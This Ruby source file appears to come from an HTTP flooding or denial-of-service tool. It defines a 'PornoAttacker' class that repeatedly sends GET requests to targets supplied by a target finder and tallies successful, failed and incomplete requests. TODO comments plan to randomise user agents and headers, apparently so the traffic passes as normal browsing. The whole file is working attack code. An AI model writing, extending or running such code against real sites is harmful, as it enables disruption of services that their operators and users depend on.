require 'net/http'
require 'etc'
require_relative './base_attacker'
require_relative '../target_finders/http_target_finder'

class PornoAttacker < BaseAttacker
  REQUEST_TIMEOUT_IN_SECONDS = 1

  def self.target_finder
    HttpTargetFinder.instance
  end

  private

  def perform_single_request
    Thread.current[:target] = PornoAttacker.target_finder.target
    uri = URI(PornoAttacker.target_finder.target)
    request = Net::HTTP.new(uri.host, uri.port)
    request.use_ssl = use_ssl?(uri)
    request.open_timeout = REQUEST_TIMEOUT_IN_SECONDS
    response = request.request_get(uri.path.empty? ? '/' : uri.path, http_request_headers)

    is_success = (200..399).member?(response.code.to_i)

    if is_success
      Stats.instance.increment_count_success
    else
      Stats.instance.increment_count_error
    end
  rescue OpenSSL::SSL::SSLError
    Stats.instance.increment_count_error
  rescue Errno::ECONNREFUSED
    Stats.instance.increment_count_incomplete
  rescue Net::OpenTimeout => e
    Stats.instance.increment_count_incomplete
  rescue Errno::EINVAL => e
    Stats.instance.increment_count_incomplete
  rescue Errno::ECONNRESET => e
    Stats.instance.increment_count_incomplete
  end

  def use_ssl?(uri)
    uri.scheme == 'https'
  end

  def http_request_headers
    {
      # TODO: Use a random user agent
      # TODO: Throw in some random headers (cookies, DNT, etc.)
      'User-Agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
    }
  end
end
